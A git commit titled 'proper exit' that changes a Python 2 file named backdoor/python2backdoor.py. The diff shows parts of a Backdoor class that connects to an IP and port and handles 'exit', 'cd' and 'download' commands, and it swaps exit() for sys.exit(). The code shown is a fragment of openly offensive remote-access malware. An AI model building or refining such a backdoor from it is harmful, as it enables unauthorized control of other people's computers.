a6b9e8381d5214369a672230599520cc2ea139f8
Akshaythulasidharan <akshaythulasidharan@gmail.com>
2020-04-16 19:23:29 -0400

    proper exit

--- backdoor/python2backdoor.py
+++ backdoor/python2backdoor.py
@@ -4,6 +4,7 @@ import json
 import subprocess
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -46,7 +47,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory(command[1])
                 elif command[0] == "download":
